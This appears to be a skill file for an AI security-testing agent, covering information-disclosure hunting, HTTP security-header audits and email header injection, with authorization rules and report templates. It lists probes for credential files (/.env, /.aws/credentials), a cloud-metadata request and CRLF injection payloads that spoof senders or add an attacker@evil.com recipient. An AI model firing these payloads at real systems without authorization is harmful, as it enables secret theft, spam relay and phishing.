---
name: info-disclosure
description: "Canonical info-disclosure capability: sensitive data leaks (PII, source code, debug endpoints, cloud metadata), HTTP security headers audit (CSP/HSTS/cookies), and email header injection (CRLF/SMTP). Consolidates 3 sub-skills: infodisclosure-hunter, performing-security-headers-audit, testing-for-email-header-injection. Use when hunting or validating info-disclosure-related vulnerabilities."
sources: consolidated
report_count: 19
---

# INFO-DISCLOSURE — Canonical Capability

## 1. Identity and purpose

This is the single primary executable capability for information-disclosure testing. It consolidates 3 previously separate sub-skills into one operational entry point while preserving all source content in `references/` and the original sub-skill directories for rollback.

Primary objectives:
- Discover endpoints that leak sensitive metadata, internal configurations, PII, application secrets, source code, debug endpoints, and cloud metadata.
- Audit HTTP security headers (HSTS, CSP, X-Frame-Options, X-Content-Type-Options, Referrer-Policy, Permissions-Policy, cookie attributes, cache-control, information-leaking headers).
- Test email-sending features (contact forms, password reset, newsletter, share/invite, email APIs) for CRLF/SMTP header injection, recipient manipulation, spam relay, and spoofing.
- Produce reproducible, impact-rated findings with remediation guidance.

## 2. Scope

In scope:
- Information disclosure: over-privileged API responses, stack traces, source code, debug/actuator endpoints, cloud storage (S3/GCP/Azure) ACL misconfig, marketplace/internal RPC metadata leaks, framework default servlets, predictable/leaked IDs, source maps, cloud metadata (IMDS).
- Security headers audit: transport security (HSTS, HTTPS redirect, mixed content), CSP analysis and bypass, frame protection, MIME sniffing, referrer policy, permissions policy, cross-origin isolation, cookie security flags, cache-control on sensitive pages, server/version header leakage.
- Email header injection: CRLF injection in email-related fields, CC/BCC/From/Reply-To injection, MIME body override, SMTP command injection, JSON-based email API injection, spam relay abuse.

Out of scope (hand off):
- Pure XSS discovery -> `xss` capability (use security-headers/CSP sections when CSP gating matters).
- IDOR/BOLA object-level authorization -> `idor`/`authorization` capabilities (chain when leaked IDs enable access).
- Subdomain takeover execution -> `hunt-subdomain`.
- SSRF to cloud metadata beyond disclosure -> `ssrf` capability.
- Command injection -> `command-injection` capability.

## 3. Invocation and routing

Use this capability when:
- A target returns sensitive data in API responses, errors, or metadata.
- You are reviewing HTTP security headers for missing/misconfigured browser-level protections.
- You are testing any user-input-driven email-sending feature.
- You observe leaked IDs, secrets, source maps, debug endpoints, or cloud metadata.

Routing notes:
- Start with `references/infodisclosure-hunter.md` for hunting methodology, recon checklist, bypass techniques, chaining, and reporting.
- Use `references/performing-security-headers-audit.md` for step-by-step header collection, HSTS/CSP/cookie/cache audit, and reporting templates.
- Use `references/testing-for-email-header-injection.md` for injection point discovery, CRLF variants, MIME override, validation, and reporting.
- Chain to `xss` for CSP bypass exploitation, `idor` for leaked-ID abuse, `ssrf` for metadata reachability, `hunt-subdomain` for dangling trusted origins.

## 4. Inputs and outputs

Inputs:
- Target base URLs, API endpoints, request templates, and authenticated sessions.
- HTTP response headers (curl/Burp) for header audit.
- Email-sending endpoints and sample payloads for injection testing.
- Optional: Burp Suite project, browser automation, wordlists, OOB (Collaborator) endpoint, cloud bucket naming patterns.

Outputs:
- Confirmed or refuted information-disclosure findings with request/response proof.
- Security headers assessment report with grades and remediation priority.
- Email header injection findings with injection point, encoding, impact, and remediation.
- False-positive rulings with disproof rationale.
- Reproduction steps, impact assessment, and remediation guidance.

## 5. Preconditions and authorization

- Confirm written authorization and scope before testing; include hosts, APIs, email features, and test accounts.
- Use only test accounts and non-production data unless explicitly authorized.
- Respect rate limits and avoid destructive operations on shared resources.
- Do not access other users' data beyond proof of control; redact PII in reports.
- For email injection, use attacker-controlled recipient addresses you own; do not relay spam to third parties.
- Document any out-of-scope endpoint discovered and hand off rather than exploit.

## 6. Reconnaissance

Recon steps:
1. Collect endpoints from OpenAPI/Swagger, Postman, JS bundles, source maps, mobile traffic, and proxy logs; grep for `api`, `v1`, `graphql`, `token`, `profile`, `balance`, `debug`, `env`, `actuator`.
2. Probe common sensitive paths: `/.env`, `/.git`, `/.aws/credentials`, `/backup.sql`, `/dump.gz`, `/server-status`, `/manage/env`, `/actuator/heapdump`, `/metadata/v1/`, source maps (`*.map`).
3. Analyze JS files for `API_KEY`, `SECRET`, `internal_url`, hardcoded UUIDs; run SecretFinder and Cloud Storage Sifter.
4. Fuzz hidden parameters: `?debug=true`, `?admin=1`, `?source=1`, `?env=prod`.
5. Enumerate IDs: sequential vs UUID; check `X-Request-Id`, meta tags, error messages for leaked IDs.
6. For headers: collect response headers across key pages (`/`, `/login`, `/api/health`, `/admin`, `/account/settings`) over both HTTP and HTTPS.
7. For email: identify contact/share/invite/forgot-password/email-API endpoints and fields that flow into email headers.

See `references/infodisclosure-hunter.md` (Recon Checklist, ID/Target Discovery), `references/performing-security-headers-audit.md` (Step 1), and `references/testing-for-email-header-injection.md` (Step 1).

## 7. Detection methodology

Core detection flow:
1. For info disclosure: probe sensitive endpoints and parameters; diff responses for secrets/PII/stack traces; validate data is non-public and actionable.
2. For headers: collect and grade each security header; identify missing/misconfigured directives and cookie flags; check cache-control on sensitive pages and version-leaking headers.
3. For email injection: inject CRLF variants (`%0D%0A`, `%0A`, `%0D`, double-encoded) into each email-related field; monitor attacker inbox and raw message headers for injected headers/recipients.
4. Validate every candidate with a second independent request/account and mark refuted if not proven.
5. Confirm exploitability per sub-capability; configuration presence or reflection alone is not a finding.

References by phase:
- Hunting: `references/infodisclosure-hunter.md`.
- Headers: `references/performing-security-headers-audit.md`.
- Email injection: `references/testing-for-email-header-injection.md`.

## 8. Technique selection

Select techniques by observed behavior:
- Unknown surface -> endpoint discovery + sensitive path fuzzing + JS secret scanning.
- Error/stack trace -> malformed encoding payloads (`%ff`, `%E2%9C%93`) and content-type confusion.
- Cloud storage -> bucket name/UUID guessing and ACL checks.
- Leaked IDs -> ID enumeration and cross-user access attempts (chain to IDOR).
- Missing headers -> grade and prioritize per impact; test CSP bypass gadgets if CSP present.
- Weak CSP (`unsafe-inline`/`unsafe-eval`/wildcards) -> XSS execution and exfiltration channels.
- Email field reflects into headers -> CRLF variants, MIME override, SMTP command injection, JSON array injection.
- Spam relay candidate -> inject multiple BCC/To recipients and confirm delivery.

## 9. Execution steps

1. Establish baseline requests per endpoint and record responses/headers.
2. Replay with one controlled change at a time; record status, headers, body, timing.
3. For info disclosure: verify leaked data is non-public and actionable; redact in notes.
4. For headers: audit HSTS, CSP, frame options, content-type options, referrer policy, permissions policy, cross-origin headers, cookie flags, cache-control, and version headers.
5. For email injection: test each field with CRLF variants and encodings; check attacker inbox and raw headers; test JSON arrays and MIME overrides.
6. Confirm exploitability with clean reproduction (request/response or browser proof).
7. Stop and document when a vector is not exploitable or out of scope.

## 10. Tool usage

- Proxy: Burp Suite (Repeater, Intruder, Comparer, Logger++).
- Discovery: ffuf, httpx, dirsearch, SecretFinder, Cloud Storage Sifter.
- Headers: curl, SecurityHeaders.com, Mozilla Observatory, CSP Evaluator (Google), Hardenize.
- Email: Burp Suite, swaks, OWASP ZAP, mailhog, smtp4dev, Nuclei.
- Cloud: awscli, gcloud, az CLI for bucket/ACL checks.
- Automation: Python requests/httpx, curl, jq.
- Evidence: screenshots, saved requests/responses, canary values, OOB interactions.

See references for tool-specific commands and systems.

## 11. Payloads and test cases

Representative test cases (adapt to target):

Information disclosure:
- Sensitive paths: `/.env`, `/.git/HEAD`, `/actuator/env`, `/actuator/heapdump`, `/server-status`, `/backup.sql`, `app.min.js.map`.
- Malformed encoding: `?search=%ff`, `?utf8=%E2%9C%93`.
- Spring path normalization: `/api/v1/..;/..;/manage/env`.
- GraphQL introspection: `{"query":"query{__schema{queryType{name}}}"}`.
- Cloud metadata: `PUT` token then `GET http://169.254.169.254/latest/meta-data/`.

Security headers:
- Missing HSTS/CSP/X-Frame-Options/X-Content-Type-Options/Referrer-Policy/Permissions-Policy.
- Weak CSP: `script-src 'self' 'unsafe-inline'`, `script-src *`, report-only mode.
- Cookie flags: missing Secure/HttpOnly/SameSite; `__Host-`/`__Secure-` prefix checks.
- Version leakage: `Server`, `X-Powered-By`, `X-AspNet-Version`.

Email header injection:
- CRLF: `test@test.com%0ACc:attacker@evil.com`, `%0D%0A`, `%0A`, `%0D`, double-encoded `%250A`.
- Fields: email, name, subject, Reply-To.
- MIME override: `test@test.com%0AContent-Type:text/html%0A%0A<h1>Phishing</h1>`.
- From spoofing: `test@test.com%0AFrom:ceo@target.com`.
- SMTP command: `test@test.com%0ARCPT TO:attacker@evil.com`.
- JSON: `{"to":"test@test.com\nCc:attacker@evil.com",...}`, array injection `{"to":["test@test.com","attacker@evil.com"]}`.

## 12. Evidence

Each finding must include:
- Exact request and response (raw HTTP or browser network capture).
- Authentication context and account/role used.
- For info disclosure: the sensitive data type and why it is non-public/actionable.
- For headers: header name, current value, recommended value, and grading.
- For email injection: injection point, payload, encoding, received email raw headers, and impact.
- Impact assessment and affected data scope.

## 13. Reproduction and validation

- Reproduce info-disclosure with a clean request and confirm data is non-public.
- Reproduce headers audit by re-fetching and grading consistently; confirm CSP enforcement (not report-only) when claiming bypass.
- Reproduce email injection by receiving the injected email and inspecting raw headers; confirm spam relay if claimed.
- Validate with a second request/account where applicable.
- Mark as refuted if data is public, header is enforced, or injection is sanitized.

## 14. False-positive rejection

Reject or downgrade when:
- Disclosed data is public, non-sensitive, or already documented.
- Software version headers alone with no exploitable vulnerability.
- CSP is report-only (still a misconfiguration, but not a bypass; classify accordingly).
- `unsafe-inline` present but CSP not enforced or overridden.
- Cookie missing flags on non-session/non-sensitive cookies.
- Email input is sanitized/stripped and no header is injected.
- Response differences due to caching, localization, or benign metadata.
- Framework defaults or dev-only routes are not reachable in production.

## 15. Impact

Impact guidance:
- Critical: application secret keys enabling RCE/session forgery; cloud root credentials; bulk PII/secrets.
- High: database credentials; CVE-based source leaks; email header injection enabling spam relay/phishing or password-reset token theft.
- Medium: internal IPs/RPC metadata; weak CSP enabling XSS; missing HSTS enabling SSL stripping; cookie flags on session tokens.
- Low: software versions; verbose error messages; missing non-critical headers.
- Informational: best-practice header hardening with no direct exploitability.

Always tie impact to business risk and data scope; avoid severity inflation from header presence alone.

## 16. Reporting

Report template (adapt per vector):

Info disclosure:
```
### Summary
The endpoint [ENDPOINT] is disclosing sensitive information [TYPE] due to [CAUSE].

### Steps to Reproduce
1. Navigate to [URL].
2. Send request [REQUEST].
3. Observe response containing [SENSITIVE_DATA].

### Impact
An attacker can use this information to [ESCALATION_PATH], leading to [FINAL_IMPACT].

### Suggested Mitigation
Restrict access and filter sensitive fields during serialization.
```

Headers audit: use the Security Headers Audit Report format (headers table, cookie table, info disclosure table, recommendation priority).

Email injection: use the Email Header Injection Report format (injection point, encoding, findings table, remediation).

## 17. Failure modes

- Surface not fully discovered -> expand recon, check mobile/SPA, versions, content types.
- No test account -> request credentials or scope clarification.
- WAF/gateway blocks payloads -> try content-type confusion, encoding, or parser differentials.
- Rate limiting stops testing -> coordinate throttling or hand off.
- Email injection not confirmed -> check spam folders, raw headers, alternate encodings.
- Header audit inconclusive -> re-fetch from multiple vantage points and pages.
- Inconclusive authorization/origin result -> repeat with fresh sessions and diff; mark not confirmed if ambiguous.

## 18. References

All 3 sub-skill references are preserved and must resolve:

| Reference | Sub-capability | Load when |
|---|---|---|
| `references/infodisclosure-hunter.md` | `infodisclosure-hunter` | Hunting methodology, recon checklist, bypasses, chaining, triage, reporting |
| `references/performing-security-headers-audit.md` | `performing-security-headers-audit` | Step-by-step header collection, HSTS/CSP/cookie/cache audit, reporting |
| `references/testing-for-email-header-injection.md` | `testing-for-email-header-injection` | Injection point discovery, CRLF variants, MIME/SMTP injection, validation, reporting |

Original sub-skills remain intact under `infodisclosure-hunter/`, `performing-security-headers-audit/`, and `testing-for-email-header-injection/`.

## 19. Testing and mastery

- Validate with the capability tests in `tests/test_info_disclosure_capability.py`.
- Confirm all referenced files resolve and are non-empty.
- Confirm migration map paths/hashes/status are accurate.
- Practice on authorized labs: PortSwigger info-disclosure labs, OWASP crAPI, email injection labs, and CSP bypass challenges.
- Mastery criteria: independently discover, validate, and report an information-disclosure, security-headers, or email-injection finding with full reproduction, impact, and remediation.


## Knowledge sources

- WKS bug classes: info_disclosure
- Domain knowledge: info_disclosure
- WKS remains the structured source of truth; retrieve and validate items through WKS rather than duplicating the full corpus in this skill.
- Research and learning material is mapped in `stage-a/knowledge-source-map.json` and must be validated before promotion.
